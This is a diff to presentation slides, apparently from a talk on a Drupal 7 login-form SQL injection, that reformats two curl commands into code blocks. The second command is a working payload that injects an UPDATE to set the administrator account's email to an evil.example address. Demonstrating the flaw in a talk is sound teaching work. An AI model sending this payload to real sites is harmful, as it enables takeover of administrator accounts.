@@ -267,10 +267,16 @@
 				<section data-markdown>
 					<script type="text/template">
 						### Normal POST to login:
-						`curl -d "name[]=greggles&pass=test&form_id=user_login_block&op=Log+in" http://sitename`
+						```
+						curl -d "name[]=greggles&pass=test&form_id=user_login_block&op=Log+in" http://sitename
+						```
 
 						### POST to exploit sql injection
-						`curl -d "name[1+;UPDATE+{users}+set+mail%3d+%27pajamas%40evil.example%27+where+uid%3d1;+--+]=&name[1]=&pass=test&form_id=user_login_block&op=Log+in" http://www.d7.dev`
+						```
+						curl -d "name[1+;UPDATE+{users}+set+mail%3d+%27pajamas%40evil.example%27\
+						+where+uid%3d1;+--+]=&name[1]=&pass=test&form_id=user_login_block&op=\
+						Log+in" http://www.d7.dev
+						```
 					</script>
 				</section>
 
